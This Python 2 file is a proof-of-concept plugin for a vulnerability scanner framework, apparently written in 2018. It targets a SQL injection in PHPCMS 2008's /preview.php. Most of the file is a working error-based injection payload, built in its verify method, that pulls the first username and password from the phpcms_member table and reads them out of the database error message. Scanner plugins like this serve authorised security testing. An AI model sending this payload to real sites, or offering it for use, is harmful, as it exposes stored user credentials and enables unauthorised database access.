# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0006' # 平台漏洞编号，留空
    name = 'PHPCMS 2008 /preview.php SQL注入漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = 'Unkonwn'  # 漏洞公布时间
    desc = '''
        PHPCMS 2008 /preview.php SQL注入漏洞
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=022112' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'PHPCMS'  # 漏洞应用名称
    product_version = '2008'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f81f1825-83f1-4825-96a9-608ecf3c7f77'
    author = '国光'  # POC编写者
    create_date = '2018-05-10' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/preview.php?info[catid]=15&content=a[page]b&info[contentid]=2'%20and%20(select%201%20from("
                   "select%20count(*),concat((select%20(select%20(select%20concat(0x7e,0x27,username,0x3a,password,"
                   "0x27,0x7e)%20from%20phpcms_member%20limit%200,1))%20from%20information_schema.tables%20limit%200"
                   ",1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)--%20a")
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            reg = re.compile("Duplicate entry '~'(.*?)'~1' for key 'group_key'")
            res = reg.findall(content)
            if res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()